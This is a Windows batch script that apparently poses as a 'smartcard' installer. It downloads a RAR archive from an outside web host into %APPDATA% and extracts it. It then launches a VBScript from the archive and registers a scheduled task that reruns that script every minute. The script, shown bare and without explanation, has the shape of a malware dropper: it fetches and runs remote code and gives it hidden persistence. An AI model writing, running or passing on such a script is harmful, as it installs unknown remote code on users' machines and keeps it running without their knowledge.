@echo off
mkdir %APPDATA%\smartcard
cd %APPDATA%\smartcard
del /f smartcard.bat
ECHO =================================================
ECHO ..................Downloading....................
curl http://www.file.maews.com/smartcard.rar -o install.rar
set path=%SYSTEMDRIVE%\Program Files\WinRAR
unrar e install.rar
del /f install.rar
set path=C:\Windows\System32
timeout /t 5 /nobreak > nul
start %APPDATA%\smartcard\task.vbs
ECHO =================================================
ECHO ..................Installing.....................
schtasks /create /tn "smartcard" /sc minute /mo 1 /tr "%APPDATA%\smartcard\task.vbs"
timeout /t 5 /nobreak > nul